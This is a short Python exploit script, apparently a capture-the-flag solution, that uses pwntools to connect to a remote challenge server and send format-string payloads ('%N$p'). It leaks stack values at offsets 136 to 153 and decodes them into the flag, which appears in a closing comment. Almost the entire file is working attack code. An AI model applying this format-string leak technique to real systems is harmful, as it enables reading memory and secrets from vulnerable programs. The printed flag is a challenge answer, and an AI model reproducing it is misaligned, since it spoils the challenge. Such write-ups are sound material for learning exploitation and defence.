import binascii
from pwn import *

elf=ELF('./main')

def hex_to_ascii(hex_str):
    hex_str = hex_str.replace(' ', '').replace('0x', '').replace('\t', '').replace('\n', '')
    ascii_str = binascii.unhexlify(hex_str)
    return ascii_str

def leak_stuff(i):
    # p=elf.process()
    p=remote("34.40.59.4",32300)

    # fill the 2 reads befor the printf
    p.recvuntil(b'Do you have the control?')
    p.sendline(b'A'*8)
    p.recvuntil(b'Do you have the control?')
    p.sendline(b'A'*8)
    
    # i==3 so we have the printf
    p.recvuntil(b'Do you have the control?\r\n')
    payload=b'...%'+str(i).encode()+b'$p...'
    p.sendline(payload)
    leak=p.recvuntil(b'Do you have the control?')
    p.close()
    return leak.decode().split('...')[3]

flag_vector=[]
for i in range(136,154):
    data=leak_stuff(i)
    # print(i)
    # print(data)
    flag_vector.append(hex_to_ascii(data)[::-1].decode())

print(flag_vector)
print(''.join(flag_vector).replace("X",""))

# ctf{fad65340180f6b4c6f49dad138daeed447cf23f994635481f92551f05dbc6070}
